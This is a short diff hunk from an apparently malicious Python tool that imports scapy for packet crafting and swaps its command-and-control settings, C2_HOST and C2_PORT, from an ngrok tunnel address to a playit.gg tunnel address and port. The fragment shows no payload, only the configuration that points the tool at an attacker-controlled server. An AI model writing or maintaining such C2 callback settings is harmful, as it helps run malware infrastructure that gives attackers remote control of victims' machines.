@@ -91,8 +91,8 @@ import struct
 from scapy.all import *  # Requires scapy for packet crafting
 import os
 
-C2_HOST = "1.tcp.ap.ngrok.io"
-C2_PORT = 12345
+C2_HOST = "meet-true.gl.at.ply.gg"
+C2_PORT = 46276
 
 def random_string(length=8):
     return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
